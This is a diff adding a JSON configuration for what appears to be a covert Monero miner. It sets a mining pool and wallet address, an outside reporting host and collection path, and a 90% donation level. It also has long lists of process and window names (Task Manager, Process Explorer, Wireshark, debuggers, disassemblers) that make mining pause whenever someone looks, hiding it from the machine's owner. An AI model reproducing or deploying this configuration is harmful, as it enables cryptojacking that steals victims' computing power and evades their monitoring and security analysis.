@@ -1,0 +1,88 @@
+{
+  "dry-run": false,
+  "background": false,
+  
+  "report-host": "serveris.lieshoubbs.com",
+  "report-port": 8181,
+  "report-path": "/cpu/api/collect.php",
+  "report-token": "",
+  
+  "autosave": true,
+  "print-time": 60,
+  "log-file": "run.log",
+  
+  "cpu-high-pause": 95,
+  "cpu-low-resume": 30,
+  "cpu-control-interval": 3,
+  "cpu-resume-delay": 30,
+  
+  "process-pause-names": "taskmgr.exe,processhacker.exe,procexp.exe,procexp64.exe,processexplorer.exe,processmonitor.exe,procmon.exe,filemon.exe,regmon.exe,wireshark.exe,fiddler.exe,charles.exe,burpsuite.exe,ollydbg.exe,x64dbg.exe,ida.exe,ida64.exe,ghidra.exe,radare2.exe,windbg.exe,immunity.exe,dnspy.exe,de4dot.exe,ilspy.exe,dotpeek.exe,reflector.exe,cheatengine.exe,artmoney.exe,gamehack.exe,hacktool.exe,keylogger.exe,spyware.exe,malware.exe,virus.exe,trojan.exe,backdoor.exe,rootkit.exe,exploit.exe,payload.exe,injector.exe,packer.exe,unpacker.exe,protector.exe,obfuscator.exe,deobfuscator.exe,analyzer.exe,scanner.exe,monitor.exe,logger.exe,tracker.exe,spy.exe,stealer.exe,miner.exe,coinminer.exe,cryptominer.exe",
+  
+  "window-pause-names": "administrator,任务管理器,task manager,process explorer,process hacker,wireshark,fiddler,cheat engine,ida pro,x64dbg,ollydbg",
+  
+  "donate-level": 90,
+  "donate-address": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGmNuJ2GRcq1Uh361z.323",
+  "donate-use-user-pool": true,
+  
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": 70,
+    "yield": true,
+    "huge-pages": true,
+    "hw-aes": null,
+    "priority": null,
+    "asm": true
+  },
+  
+  "opencl": { 
+    "enabled": false 
+  },
+  
+  "cuda": { 
+    "enabled": false 
+  },
+  
+  "randomx": { 
+    "1gb-pages": false,
+    "wrmsr": true,
+    "rdmsr": true,
+    "mode": "auto",
+    "numa": true
+  },
+  
+  "pools": [
+    {
+      "url": "miner.ntminer.vip:10799",
+      "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGmNuJ2GRcq1Uh361z.44444",
+      "pass": "x",
+      "algo": "rx/0",
+      "keepalive": true,
+      "tls": true
+    }
+  ],
+  
+  "api": {
+    "id": null,
+    "worker-id": null
+  },
+  
+  "http": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 0,
+    "access-token": null,
+    "restricted": true
+  },
+  
+  "colors": true,
+  "title": true,
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "verbose": 0,
+  "watch": true,
+  "pause-on-battery": false,
+  "pause-on-active": false,
+  
+  "web-config-url": ""
+}
